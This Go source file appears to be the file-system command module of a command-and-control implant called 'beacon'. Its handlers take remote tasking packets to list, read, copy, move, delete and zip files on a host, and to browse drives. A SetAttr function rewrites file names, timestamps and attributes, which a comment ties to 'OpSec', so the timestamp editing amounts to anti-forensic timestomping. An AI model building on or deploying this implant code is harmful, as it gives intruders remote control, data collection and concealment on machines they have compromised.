package command

import (
	archivezip "archive/zip"
	"beacon/pkg/utils/encoding"
	"beacon/pkg/utils/packet"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Cd 实现切换工作目录的功能。
func Cd(packer *packet.Parser, ACP int) ([]byte, error) {
	argCount := packer.ParseInt32()

	// 如果没有参数，返回当前工作目录
	if argCount == 0 {
		wd, _ := os.Getwd()
		result := []byte(wd)
		return packet.PackArray([]any{result})
	}

	// 解析目标路径并转换为 UTF-8
	path := encoding.ConvertCpToUTF8(packer.ParseString(), ACP)

	// 尝试切换目录
	err := os.Chdir(path)
	if err != nil {
		return nil, err
	}

	// 获取切换后的当前工作目录
	wd, err := os.Getwd()
	if err != nil {
		// 如果获取 wd 失败，至少返回目标路径
		wd = path
	}

	result := []byte(wd)
	return packet.PackArray([]any{result})
}

// Ls 实现列出目录内容的功能。
func Ls(packer *packet.Parser, ACP int) ([]byte, error) {
	argCount := packer.ParseInt32()
	path := "."

	// 如果有参数，解析目标路径并转换为 UTF-8
	if argCount > 0 {
		path = encoding.ConvertCpToUTF8(packer.ParseString(), ACP)
	}

	// 尝试打开并读取目录
	entries, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}

	// 准备返回结果，这里我们返回一个美化后的字符串列表
	result := fmt.Sprintf("Listing directory: %s\n", path)
	result += fmt.Sprintf("%-20s %-10s %-20s %s\n", "Mode", "Size", "ModTime", "Name")
	result += "--------------------------------------------------------------------------------\n"

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		mode := info.Mode().String()
		size := info.Size()
		modTime := info.ModTime().Format(time.RFC822)
		name := info.Name()

		if entry.IsDir() {
			name += "/"
		}

		result += fmt.Sprintf("%-20s %-10d %-20s %s\n", mode, size, modTime, name)
	}

	resultBytes := []byte(result)
	return packet.PackArray([]any{resultBytes})
}

// Pwd 获取当前工作目录
func Pwd(p *packet.Parser) ([]byte, error) {
	wd, err := os.Getwd()
	if err != nil {
		return nil, err
	}
	return packet.PackArray([]any{[]byte(wd)})
}

// Cat 安全读取文件内容 (限制 10MB)
func Cat(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount == 0 {
		return nil, fmt.Errorf("cat requires 1 argument")
	}
	path := encoding.ConvertCpToUTF8(p.ParseString(), acp)

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	// 安全限制：10MB
	limit := int64(10 * 1024 * 1024)
	if info.Size() > limit {
		return nil, fmt.Errorf("file size %d exceeds 10MB limit", info.Size())
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return packet.PackArray([]any{data})
}

// Mkdir 递归创建目录
func Mkdir(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount == 0 {
		return nil, fmt.Errorf("mkdir requires 1 argument")
	}
	path := encoding.ConvertCpToUTF8(p.ParseString(), acp)

	err := os.Mkdir(path, 0755)
	if err != nil {
		return nil, err
	}
	result := []byte("Directory created")
	return packet.PackArray([]any{result})
}

// Rm 递归删除路径
func Rm(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount == 0 {
		return nil, fmt.Errorf("rm requires 1 argument")
	}
	path := encoding.ConvertCpToUTF8(p.ParseString(), acp)

	err := os.Remove(path)
	if err != nil {
		return nil, err
	}
	result := []byte("Removed")
	return packet.PackArray([]any{result})
}

// Mv 移动文件或重命名。支持同磁盘分区下的原子重命名，
// 以及跨磁盘分区的“复制+删除”回退机制。
func Mv(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount < 2 {
		return nil, fmt.Errorf("mv requires 2 arguments (src, dst)")
	}
	src := encoding.ConvertCpToUTF8(p.ParseString(), acp)
	dst := encoding.ConvertCpToUTF8(p.ParseString(), acp)

	// 智能路径处理：如果 dst 是一个已存在的目录，则将文件移动到该目录下
	if info, err := os.Stat(dst); err == nil && info.IsDir() {
		dst = filepath.Join(dst, filepath.Base(src))
	}

	// 1. 首先尝试原子重命名 (同分区高性能)
	err := os.Rename(src, dst)
	if err == nil {
		result := []byte("Moved")
		return packet.PackArray([]any{result})
	}

	// 2. 如果重命名失败，尝试降级回退到“复制+删除”模式 (处理跨分区)
	n, copyErr := copyFileInternal(src, dst)
	_ = n
	if copyErr != nil {
		// 清理可能残留的不完整目标文件
		os.Remove(dst)
		return nil, fmt.Errorf("cross-volume move failed: %v (rename error was: %v)", copyErr, err)
	}

	// 复制成功后删除源文件
	removeErr := os.RemoveAll(src)
	if removeErr != nil {
		result := []byte(fmt.Sprintf("Moved, but failed to remove source: %v", removeErr))
		return packet.PackArray([]any{result})
	}

	result := []byte("Moved")
	return packet.PackArray([]any{result})
}

// Cp 复制文件。该版本会保留源文件的权限位（如执行位）。
func Cp(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount < 2 {
		return nil, fmt.Errorf("cp requires 2 arguments (src, dst)")
	}
	srcPath := encoding.ConvertCpToUTF8(p.ParseString(), acp)
	dstPath := encoding.ConvertCpToUTF8(p.ParseString(), acp)

	// 智能路径处理：如果 dstPath 是一个已存在的目录，则将文件复制到该目录下
	if info, err := os.Stat(dstPath); err == nil && info.IsDir() {
		dstPath = filepath.Join(dstPath, filepath.Base(srcPath))
	}

	n, err := copyFileInternal(srcPath, dstPath)
	if err != nil {
		return nil, err
	}

	_ = n
	result := []byte("Copied")
	return packet.PackArray([]any{result})
}

type zipStats struct {
	Files    int
	Dirs     int
	Skipped  int
	BytesIn  int64
	BytesOut int64
}

// Zip 将指定文件或目录压缩为 zip 文件，并返回普通命令文本结果。
func Zip(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount != 4 {
		return packZipText(fmt.Sprintf("zip failed: requires 4 arguments (source_path, zip_path, overwrite, include_root), got %d", argCount))
	}

	sourcePath := encoding.ConvertCpToUTF8(p.ParseString(), acp)
	zipPath := encoding.ConvertCpToUTF8(p.ParseString(), acp)
	overwrite := p.ParseInt32()
	includeRoot := p.ParseInt32()
	if p.HasError() {
		return packZipText(fmt.Sprintf("zip failed: %v", p.Error()))
	}
	if overwrite != 0 && overwrite != 1 {
		return packZipText("zip failed: overwrite must be 0 or 1")
	}
	if includeRoot != 0 && includeRoot != 1 {
		return packZipText("zip failed: include_root must be 0 or 1")
	}

	stats, err := createZipArchive(sourcePath, zipPath, overwrite == 1, includeRoot == 1)
	if err != nil {
		return packZipText(fmt.Sprintf("zip failed: %v", err))
	}

	return packZipText(fmt.Sprintf(
		"zip success: source=%s zip=%s files=%d dirs=%d skipped=%d bytes_in=%d bytes_out=%d",
		sourcePath,
		zipPath,
		stats.Files,
		stats.Dirs,
		stats.Skipped,
		stats.BytesIn,
		stats.BytesOut,
	))
}

func packZipText(message string) ([]byte, error) {
	return packet.PackArray([]any{[]byte(message)})
}

func createZipArchive(sourcePath string, zipPath string, overwrite bool, includeRoot bool) (zipStats, error) {
	var stats zipStats

	sourcePath = strings.TrimSpace(sourcePath)
	zipPath = strings.TrimSpace(zipPath)
	if sourcePath == "" {
		return stats, fmt.Errorf("source_path is required")
	}
	if zipPath == "" {
		return stats, fmt.Errorf("zip_path is required")
	}

	sourceInfo, err := os.Lstat(sourcePath)
	if err != nil {
		return stats, err
	}
	if sourceInfo.Mode()&os.ModeSymlink != 0 {
		return stats, fmt.Errorf("source_path must not be a symlink")
	}

	parentDir := filepath.Dir(zipPath)
	parentInfo, err := os.Stat(parentDir)
	if err != nil {
		return stats, fmt.Errorf("zip parent directory is not accessible: %v", err)
	}
	if !parentInfo.IsDir() {
		return stats, fmt.Errorf("zip parent path is not a directory: %s", parentDir)
	}

	sourceAbs, err := filepath.Abs(sourcePath)
	if err != nil {
		return stats, err
	}
	zipAbs, err := filepath.Abs(zipPath)
	if err != nil {
		return stats, err
	}
	if sameFilesystemPath(sourceAbs, zipAbs) {
		return stats, fmt.Errorf("zip_path must be different from source_path")
	}

	if _, err := os.Stat(zipPath); err == nil && !overwrite {
		return stats, fmt.Errorf("zip_path already exists")
	} else if err != nil && !os.IsNotExist(err) {
		return stats, err
	}

	out, err := os.OpenFile(zipPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return stats, err
	}

	zipWriter := archivezip.NewWriter(out)
	writeErr := writeZipEntries(zipWriter, sourceAbs, zipAbs, sourceInfo, includeRoot, &stats)
	closeErr := zipWriter.Close()
	fileCloseErr := out.Close()
	if writeErr != nil {
		_ = os.Remove(zipPath)
		return stats, writeErr
	}
	if closeErr != nil {
		_ = os.Remove(zipPath)
		return stats, closeErr
	}
	if fileCloseErr != nil {
		_ = os.Remove(zipPath)
		return stats, fileCloseErr
	}

	if outInfo, err := os.Stat(zipPath); err == nil {
		stats.BytesOut = outInfo.Size()
	}
	return stats, nil
}

func writeZipEntries(zipWriter *archivezip.Writer, sourceAbs string, zipAbs string, sourceInfo os.FileInfo, includeRoot bool, stats *zipStats) error {
	baseDir := filepath.Dir(sourceAbs)
	if sourceInfo.IsDir() && !includeRoot {
		baseDir = sourceAbs
	}

	if !sourceInfo.IsDir() {
		return addZipEntry(zipWriter, sourceAbs, baseDir, zipAbs, stats)
	}

	return filepath.WalkDir(sourceAbs, func(path string, entry os.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		if sameFilesystemPath(path, zipAbs) {
			stats.Skipped++
			if entry.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}
		if path == sourceAbs && !includeRoot {
			return nil
		}
		return addZipEntry(zipWriter, path, baseDir, zipAbs, stats)
	})
}

func addZipEntry(zipWriter *archivezip.Writer, path string, baseDir string, zipAbs string, stats *zipStats) error {
	info, err := os.Lstat(path)
	if err != nil {
		return err
	}
	if info.Mode()&os.ModeSymlink != 0 {
		stats.Skipped++
		return nil
	}

	name, err := zipEntryName(baseDir, path)
	if err != nil {
		return err
	}
	if name == "" {
		return nil
	}

	header, err := archivezip.FileInfoHeader(info)
	if err != nil {
		return err
	}
	header.Name = name
	if info.IsDir() {
		if !strings.HasSuffix(header.Name, "/") {
			header.Name += "/"
		}
		stats.Dirs++
		_, err = zipWriter.CreateHeader(header)
		return err
	}
	if !info.Mode().IsRegular() {
		stats.Skipped++
		return nil
	}
	if sameFilesystemPath(path, zipAbs) {
		stats.Skipped++
		return nil
	}

	header.Method = archivezip.Deflate
	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return err
	}

	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	n, err := io.Copy(writer, file)
	stats.Files++
	stats.BytesIn += n
	return err
}

func zipEntryName(baseDir string, path string) (string, error) {
	rel, err := filepath.Rel(baseDir, path)
	if err != nil {
		return "", err
	}
	if rel == "." {
		return "", nil
	}
	return filepath.ToSlash(rel), nil
}

func sameFilesystemPath(a string, b string) bool {
	a = filepath.Clean(a)
	b = filepath.Clean(b)
	if runtime.GOOS == "windows" {
		return strings.EqualFold(a, b)
	}
	return a == b
}

// copyFileInternal 内部辅助函数：执行流式复制并保留文件权限
func copyFileInternal(src, dst string) (int64, error) {
	srcFile, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer srcFile.Close()

	// 获取源文件信息，包括权限位
	srcInfo, err := srcFile.Stat()
	if err != nil {
		return 0, err
	}

	// 使用源文件的原始 Mode 创建目标文件，保留权限 (如 Linux 下的 +x)
	dstFile, err := os.OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, srcInfo.Mode())
	if err != nil {
		return 0, err
	}
	defer dstFile.Close()

	n, err := io.Copy(dstFile, srcFile)
	if err != nil {
		return n, err
	}

	// 显式同步以确保数据落盘
	err = dstFile.Sync()
	return n, err
}

// FileBrowser 实现结构化的文件浏览器功能
func FileBrowser(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	path := ""
	limit := uint32(1000)
	offset := uint32(0)

	if argCount >= 1 {
		path = encoding.ConvertCpToUTF8(p.ParseString(), acp)
	}
	if argCount >= 2 {
		limit = p.ParseInt32()
	}
	if argCount >= 3 {
		offset = p.ParseInt32()
	}

	// Linux/Unix 的根目录发现应列 "/"；Windows 的空路径仍保留给盘符发现。
	if runtime.GOOS != "windows" && path == "" {
		path = "/"
	}

	// 统一获取绝对路径用于显示
	absPath, _ := filepath.Abs(path)
	if path == "" || path == "/" {
		// 如果是根目录，absPath 可能不准确 (Windows 下可能是 C:\)，保持原始请求意图
		absPath = path
	}

	header := []any{
		packet.PackBytes([]byte(absPath)), // Path
		int32(limit),                      // Limit (对齐返回类型为 int32)
		int32(offset),                     // Offset (对齐返回类型为 int32)
		false,                             // HasMore
		packet.PackBytes([]byte("")),      // ErrorMessage
		int32(0),                          // Count
	}

	// 1. 处理盘符探测 (针对 Windows 且路径为空)
	if runtime.GOOS == "windows" && (path == "" || path == "/") {
		drvs, err := listWindowsDrives()
		if err != nil {
			header[4] = packet.PackBytes([]byte(err.Error()))
			return packet.PackArray(header)
		}
		header[5] = int32(len(drvs) / 8)
		results := append(header, drvs...)
		return packet.PackArray(results)
	}

	// 3. 读取目录
	entries, err := os.ReadDir(path)
	if err != nil {
		header[4] = packet.PackBytes([]byte(err.Error()))
		return packet.PackArray(header)
	}

	// 4. 分页逻辑
	allEntriesCount := len(entries)
	start := int(offset)
	if start > allEntriesCount {
		start = allEntriesCount
	}

	end := start + int(limit)
	hasMore := false
	if end < allEntriesCount {
		hasMore = true
	} else {
		end = allEntriesCount
	}

	count := end - start
	header[3] = hasMore
	header[5] = int32(count)

	filesPart := make([]any, 0, count*8)
	for i := start; i < end; i++ {
		entry := entries[i]
		fullPath := filepath.Join(path, entry.Name())
		info, err := entry.Info()

		if err != nil {
			// 异常分支：补齐 8 个字段
			filesPart = append(filesPart,
				packet.PackBytes([]byte(entry.Name())),
				packet.PackBytes([]byte(fullPath)),
				entry.IsDir(),
				int64(0),
				int64(0),
				packet.PackBytes([]byte("unknown")),
				packet.PackBytes([]byte("unknown")),
				false,
			)
			continue
		}

		filesPart = append(filesPart,
			packet.PackBytes([]byte(entry.Name())),
			packet.PackBytes([]byte(fullPath)),
			entry.IsDir(),
			info.Size(),
			info.ModTime().UnixMilli(),
			packet.PackBytes([]byte(info.Mode().String())),
			packet.PackBytes([]byte(getFileOwner(fullPath))),
			isFileHidden(fullPath),
		)
	}

	finalResults := append(header, filesPart...)
	return packet.PackArray(finalResults)
}

// SetAttr 修改文件属性，包括文件名、时间戳和平台特定属性
func SetAttr(p *packet.Parser, acp int) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount < 2 {
		return nil, fmt.Errorf("setattr requires at least destination and flag")
	}

	targetPath := encoding.ConvertCpToUTF8(p.ParseString(), acp)
	flag := int(p.ParseInt32())

	var (
		newName   string
		mTime     int64
		aTime     int64
		cTime     int64
		winAttrs  uint32
		linuxMode uint32
	)

	// 1. 按照位掩码顺序解析后续可选参数
	// 1: new_name, 2: MTime, 4: ATime, 8: CTime, 16: WinAttributes, 32: LinuxMode
	if flag&1 != 0 {
		newName = encoding.ConvertCpToUTF8(p.ParseString(), acp)
	}
	if flag&2 != 0 {
		mTime = int64(p.ParseInt64())
	}
	if flag&4 != 0 {
		aTime = int64(p.ParseInt64())
	}
	if flag&8 != 0 {
		cTime = int64(p.ParseInt64())
	}
	if flag&16 != 0 {
		winAttrs = p.ParseInt32()
	}
	if flag&32 != 0 {
		linuxMode = p.ParseInt32()
	}

	if p.HasError() {
		return nil, p.Error()
	}

	// 2. 执行逻辑
	actualPath := targetPath

	// A. 重命名
	if flag&1 != 0 && newName != "" {
		dir := filepath.Dir(targetPath)
		newPath := filepath.Join(dir, newName)
		if err := os.Rename(targetPath, newPath); err != nil {
			return nil, fmt.Errorf("rename failed: %v", err)
		}
		actualPath = newPath
	}

	// B. 设置修改时间和访问时间 (由具体平台实现决定是否使用标准库)
	// 在 Windows 上，我们将所有时间戳逻辑下放到 applyPlatformAttributes 以保证极致 OpSec
	if runtime.GOOS != "windows" {
		if flag&2 != 0 || flag&4 != 0 {
			info, err := os.Stat(actualPath)
			if err != nil {
				return nil, err
			}
			finalATime := info.ModTime()
			finalMTime := info.ModTime()

			if flag&4 != 0 {
				finalATime = time.Unix(aTime, 0)
			}
			if flag&2 != 0 {
				finalMTime = time.Unix(mTime, 0)
			}

			if err := os.Chtimes(actualPath, finalATime, finalMTime); err != nil {
				return nil, fmt.Errorf("chtimes failed: %v", err)
			}
		}
	}

	// C. 平台特定属性修改 (创建时间、Windows 属性、Linux 权限)
	if err := applyPlatformAttributes(actualPath, flag, cTime, winAttrs, linuxMode, mTime, aTime); err != nil {
		return nil, err
	}

	result := []byte(fmt.Sprintf("Successfully updated attributes for: %s", actualPath))
	return packet.PackArray([]any{result})
}

// unixFileMode 把线上 LinuxMode 转成 chmod 用的权限位。
// 新前端发送 Unix mode 数值（0o644=420）；旧对话框把 "644" 当成十进制 644。
func unixFileMode(raw uint32) os.FileMode {
	if raw > 0o777 {
		octal := uint32(0)
		place := uint32(1)
		n := raw
		for n > 0 {
			d := n % 10
			if d > 7 {
				return os.FileMode(raw) & 0o7777
			}
			octal += d * place
			place *= 8
			n /= 10
		}
		return os.FileMode(octal) & 0o7777
	}
	return os.FileMode(raw) & 0o7777
}
